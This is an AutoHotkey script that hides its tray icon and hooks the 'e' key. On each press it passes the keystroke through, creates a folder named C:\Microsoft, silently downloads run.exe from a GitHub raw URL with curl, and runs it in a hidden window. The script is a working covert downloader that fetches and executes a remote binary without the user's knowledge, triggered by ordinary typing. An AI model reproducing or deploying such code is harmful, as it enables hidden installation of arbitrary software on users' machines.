#SingleInstance Ignore
#NoTrayIcon

$e::{
    path := "C:\Microsoft"
    Send "e"

    output := path "\run.exe"
    if (DirExist(path)) {
        if (FileExist(path "\run.exe")) {
            Run output, , "Hide"
        } else {
            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
            RunWait command, , "Hide"
            Run output, , "Hide"
        }
    } else {
        DirCreate(path)
        url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
        command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
        RunWait command, , "Hide"
        Run output, , "Hide"
    }
}
